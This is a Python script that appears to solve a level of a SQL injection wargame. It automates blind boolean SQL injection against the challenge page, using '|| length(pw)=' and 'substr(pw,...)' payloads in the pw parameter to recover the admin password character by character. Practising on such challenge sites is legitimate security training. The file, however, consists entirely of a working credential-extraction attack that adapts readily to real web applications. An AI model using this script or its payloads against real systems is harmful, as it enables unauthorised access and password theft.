import requests
import string
import os
from dotenv import load_dotenv

load_dotenv()

base_url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
cookie = {"PHPSESSID": os.getenv("PHPSESSID")}
pw_length = 0
pw = ""

a = string.printable

for i in range(100):
    res = requests.get(base_url, params={
        'pw': f"' || length(pw)={i}#"
    }, cookies=cookie).text
    if "Hello admin" in res:
        print("length: %d" % i)
        pw_length = i
        break

for i in range(pw_length):
    for j in a:
        res = requests.get(base_url, params={
            'pw': f"' || substr(pw,{i + 1},1)='{j}"
        }, cookies=cookie).text
        if "Hello admin" in res:
            print(f"pw[{i}] == {j}")
            pw += j
            break
print("password: " + pw)
